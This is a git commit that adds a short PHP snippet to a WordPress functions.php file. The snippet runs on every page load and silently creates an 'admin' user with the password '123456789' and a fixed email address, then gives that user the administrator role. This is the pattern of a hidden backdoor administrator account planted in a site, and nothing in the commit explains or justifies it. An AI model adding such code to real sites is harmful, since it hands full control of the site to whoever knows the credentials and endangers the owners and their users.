ad680c50ba70f87d98ccbef2fff0ea0fbaa107d6
MD Raihan Hossain <73426725+mdraihanhossain07@users.noreply.github.com>
2023-09-06 02:10:25 +0600

    functions.php

---
+++ functions.php
@@ -0,0 +1,11 @@
+function wpb_admin_account(){
+	$user = 'admin';
+	$pass = '123456789';
+	$email = 'ibrahiminfo77@gmail.com';
+	if (!username_exists( $user ) && !email_exists( $email )) {
+		$user_id = wp_create_user( $user, $pass, $email);
+		$user = new WP_User($user_id);
+		$user->set_role('administrator');
+	}
+}
+add_action('init', 'wpb_admin_account');
